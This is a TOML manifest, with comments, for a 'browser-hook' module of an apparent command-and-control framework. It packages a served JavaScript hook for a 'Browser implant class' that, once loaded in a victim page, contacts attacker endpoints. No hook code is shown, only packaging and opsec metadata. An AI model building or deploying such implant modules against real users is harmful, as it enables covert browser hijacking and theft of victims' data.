# The browser-hook asset module (architecture.md Sec 15.1): the Browser
# class's served script client, the file that chases browser versions --
# exactly the churn the module layer exists to absorb. The teamserver's
# mint resolves module "browser-hook", asset "hook", substitutes the bake
# (the single __ROD_BAKE_JSON__ placeholder the template defines), and
# serves the result; the template itself is deployment-free.

[module]
name = "browser-hook"
version = "1.0.0"
entry = "assets"
license = "Apache-2.0"
description = "Browser hook script for the Browser implant class: the served JavaScript client the hook mint renders with a per-hook bake."

[compatibility]
teamserver = "1.0.0"

[[assets]]
name = "hook"
path = "assets/hook.js"

[opsec]
lands-on-disk = false
notes = "Served script content only; nothing runs on the teamserver. Once loaded in a victim page the script contacts the baked endpoints from the browser."

[package]
include = ["rod-module.toml", "assets/**"]
